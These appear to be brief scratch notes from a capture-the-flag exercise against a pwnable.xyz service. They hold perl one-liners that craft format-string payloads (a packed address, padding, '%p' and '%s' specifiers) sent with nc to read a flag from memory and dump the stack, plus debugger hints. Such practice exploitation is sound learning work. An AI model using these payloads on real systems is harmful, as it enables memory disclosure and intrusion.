@@ -1,0 +1,9 @@
+Reading particular address:
+r < <(perl -e 'print "y\n" . "BBBBBB" . pack(Q,0x6010e0) . "DD" . "A"x100 . "%p "x8 . "%s"')
+
+break main? find "FLAG{"
+then read 0x601080
+perl -e 'print "y\n" . "BBBBBB" . pack(Q,0x6010e0) . "DD" . "A"x100 . "%p "x8 . "%s"' | nc svc.pwnable.xyz 30004
+
+Reading stack:
+perl -e 'print "y\n" . "%p" . "%p "x47' | nc svc.pwnable.xyz 30004
